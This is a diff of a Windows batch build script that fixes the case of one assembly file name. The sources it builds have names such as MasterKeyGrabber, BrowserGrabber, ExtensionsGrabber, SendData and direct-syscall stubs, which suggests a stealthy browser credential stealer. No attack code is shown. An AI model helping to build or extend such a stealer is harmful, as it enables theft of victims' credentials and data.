@@ -7,8 +7,8 @@ set "INCLUDE_DIR=-Iinclude"
 set "CFLAGS=-Os -fpermissive -fno-asynchronous-unwind-tables -masm=intel -fno-ident -fpack-struct=8 -falign-functions=1 -w -falign-labels=1 -fPIC"
 set "LFLAGS=-Wl,--no-seh,--enable-stdcall-fixup -mrdrnd -s -nostdlib -mwindows"
 set "CSRC=src/decoding.c src/MasterKeyGrabber.c src/ExtensionsGrabber.c src/SendData.c src/DllOps.c src/FileIO.c src/MemoryUtils.c src/BrowserGrabber.c src/hashing.c src/StringUtils.c src/main.c src/DirectoryOps.c src/globals.c src/AddrResolution.c src/PathOps.c"
-set "ASMSRC=src/asm/syscalls.asm src/asm/GetPeb.asm src/asm/NtAllocateCallBack.asm src/asm/LdrLoadDllCallBack.asm"
-set "OBJ=main.o decoding.o MasterKeyGrabber.o ExtensionsGrabber.o SendData.o DllOps.o FileIO.o MemoryUtils.o BrowserGrabber.o hashing.o StringUtils.o DirectoryOps.o globals.o AddrResolution.o PathOps.o LdrLoadDllCallBack.o syscalls.o NtAllocateCallBack.o GetPeb.o"
+set "ASMSRC=src/asm/syscalls.asm src/asm/GetPEB.asm src/asm/NtAllocateCallBack.asm src/asm/LdrLoadDllCallBack.asm"
+set "OBJ=main.o decoding.o MasterKeyGrabber.o ExtensionsGrabber.o SendData.o DllOps.o FileIO.o MemoryUtils.o BrowserGrabber.o hashing.o StringUtils.o DirectoryOps.o globals.o AddrResolution.o PathOps.o LdrLoadDllCallBack.o syscalls.o NtAllocateCallBack.o GetPEB.o"
 set "TARGET=bin\main.exe"
 
 REM CHECK ARGS
